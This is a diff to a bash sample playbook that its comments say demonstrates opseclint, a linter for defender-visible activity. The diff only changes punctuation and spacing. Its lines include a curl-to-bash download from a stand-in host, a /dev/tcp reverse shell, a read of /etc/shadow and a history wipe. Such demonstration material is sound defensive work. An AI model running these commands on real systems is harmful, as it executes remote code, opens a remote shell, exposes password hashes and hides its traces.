@@ -1,5 +1,5 @@
 #!/bin/bash
-# Sample post-compromise recon playbook — used to demonstrate opseclint.
+# Sample post-compromise recon playbook. Used to demonstrate opseclint.
 # Every line here is benign to *run* in a lab; the point is to show what a
 # defender's telemetry would light up with.
 
@@ -20,6 +20,6 @@ arp -a
 
 # The loud stuff
 curl http://198.51.100.10/stage2.sh | bash
-bash -i >& /dev/tcp/198.51.100.10/4444 0>&1
+bash -i >&/dev/tcp/198.51.100.10/4444 0>&1
 cat /etc/shadow
 history -c
